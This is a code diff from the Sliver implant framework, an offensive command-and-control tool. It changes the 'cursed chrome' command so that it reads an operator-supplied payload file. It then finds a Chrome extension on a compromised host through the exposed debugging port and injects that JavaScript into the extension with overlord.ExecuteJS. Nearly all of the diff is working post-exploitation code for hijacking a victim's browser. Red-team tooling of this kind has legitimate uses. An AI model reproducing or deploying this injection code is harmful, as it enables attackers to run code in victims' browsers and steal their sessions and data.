@@ -1,4 +1,4 @@
-package curse
+package cursed
 
 /*
 	Sliver Implant Framework
@@ -22,6 +22,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"io/ioutil"
 	"log"
 	insecureRand "math/rand"
 	"strings"
@@ -55,6 +56,14 @@ func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	if session == nil {
 		return
 	}
+
+	payloadPath := ctx.Flags.String("payload")
+	payload, err := ioutil.ReadFile(payloadPath)
+	if err != nil {
+		con.PrintErrorf("%s\n", err)
+		return
+	}
+
 	chromeProcess, err := getChromeProcess(session, ctx, con)
 	if err != nil {
 		con.PrintErrorf("%s", err)
@@ -99,11 +108,19 @@ func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	}
 	if chromeExt != nil {
 		con.Printf("success!\n")
-		con.Printf("Found Chrome extension: %s (%s)\n", chromeExt.Title, chromeExt.ID)
+		con.PrintInfof("Found viable Chrome extension: %s%s%s (%s)\n", console.Bold, chromeExt.Title, console.Normal, chromeExt.ID)
+		con.PrintInfof("Injecting payload ... ")
 
+		ctx, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
+		_, err = overlord.ExecuteJS(ctx, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+		con.Printf("success!\n")
 	} else {
 		con.Printf("failure!\n")
-		con.PrintInfof("No suitable extension was found to inject into :(\n")
+		con.PrintInfof("No viable Chrome extensions were found ☹️\n")
 	}
 }
 
@@ -184,7 +201,7 @@ func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grum
 
 	con.PrintInfof("Port forwarding %s -> %s\n", bindAddr, remoteAddr)
 
-	return nil, nil
+	return curse, nil
 }
 
 func isChromeProcess(executable string) bool {
